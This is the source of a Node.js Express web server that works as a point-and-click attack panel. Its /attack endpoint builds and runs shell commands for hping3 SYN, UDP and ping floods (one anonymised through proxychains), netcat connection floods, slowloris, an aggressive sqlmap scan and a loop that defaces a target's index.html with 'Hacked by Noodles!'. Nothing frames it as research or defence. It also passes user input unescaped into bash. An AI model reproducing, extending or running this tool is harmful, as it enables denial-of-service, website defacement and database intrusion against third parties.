const express = require('express');
const app = express();
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const publicIp = require('public-ip');
const rateLimit = require('express-rate-limit');

app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const logFilePath = path.join(__dirname, 'logs.txt');

const log = (message) => {
    const timestamp = new Date().toISOString();
    const logMessage = `[${timestamp}] ${message}\n`;
    fs.appendFile(logFilePath, logMessage, (err) => {
        if (err) console.error('Failed to write to log:', err);
    });
    console.log(logMessage.trim());
};

const apiLimiter = rateLimit({
	windowMs: 15 * 60 * 1000,
	max: 10,
	message: 'Too many requests, try again after 15 minutes',
	standardHeaders: true,
	legacyHeaders: false,
});

app.use('/attack', apiLimiter);

app.post('/attack', async (req, res) => {
    const target = req.body.target;
    const attackType = req.body.attackType;
    const duration = parseInt(req.body.duration) || 60;
    const intensity = parseInt(req.body.intensity) || 100;

    if (!target) {
        log('Error: Target URL is required.');
        return res.status(400).send('Target URL is required.');
    }

    let command = '';
    const numThreads = os.cpus().length * 4;
    const encodedTarget = encodeURIComponent(target);

    switch (attackType) {
        case 'ddos':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -c ${intensity * 100} -d 120 -S -u -p 80 --flood ${encodedTarget} & done; done"`;
            break;
        case 'deface':
            const defaceScript = `<h1>Hacked by Noodles!</h1><img src="https://i.imgur.com/xxxxx.gif" style="width: 100%; height: auto;">`;
            const encodedDefaceScript = Buffer.from(defaceScript).toString('base64');
            command = `timeout ${duration} bash -c "while true; do curl -X PUT -H 'Content-Type: text/html' -d $'${defaceScript}' ${encodedTarget}/index.html & done"`;
            break;
        case 'connect':
            command = `timeout ${duration} bash -c "for i in $(seq 1000); do while true; do nc -v ${encodedTarget} 80 & done; done"`;
            break;
        case 'tor_ddos':
           try {
                const externalIp = await publicIp.v4();
                log(`Attacker IP: ${externalIp}`);
                command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do proxychains4 hping3 -c ${intensity * 100} -d 120 -S -u -p 80 --flood ${encodedTarget} & done; done"`;
            } catch (error) {
                log(`Error getting public IP: ${error.message}`);
                return res.status(500).send(`Error getting public IP: ${error.message}`);
            }
            break;
        case 'sql_inject':
             command = `sqlmap --url "${encodedTarget}" --dbs --batch --level 5 --risk 3`;
             break;
        case 'slowloris':
            command = `timeout ${duration} perl slowloris.pl -dns ${encodedTarget} -port 80 -num ${intensity * 50}`;
            break;

        case 'udp_flood':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --udp -s 53 -p 53 --flood --rand-source ${encodedTarget} & done; done"`;
            break;

        case 'syn_flood':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S --flood --rand-source ${encodedTarget} & done; done"`;
            break;

        case 'ping_flood':
            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ping -f ${encodedTarget} & done; done"`;
            break;

        case 'nuke':
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ping -s 65500 ${encodedTarget} & done; done"`;
             break;

        default:
            log(`Error: Invalid attack type: ${attackType}`);
            return res.status(400).send('Invalid attack type.');
    }

    log(`Initiating ${attackType} attack on ${target} for ${duration} seconds with intensity ${intensity}.`);

    exec(command, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
            log(`Attack failed: ${error.message}`);
            console.error(`exec error: ${error}`);
            return res.status(500).send(`Attack failed: ${error.message}`);
        }
        if (stderr) {
             log(`Attack stderr: ${stderr}`);
        }
        log(`Attack completed. stdout: ${stdout}`);
        res.send('Attack initiated. Check logs for details.');
    });
});

app.get('/logs', (req, res) => {
    fs.readFile(logFilePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Failed to read logs:', err);
            return res.status(500).send('Failed to read logs.');
        }
        res.send(data.split('\n').reverse().join('\n'));
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server listening on port ${PORT}`);
    log(`Server started on port ${PORT}`);
});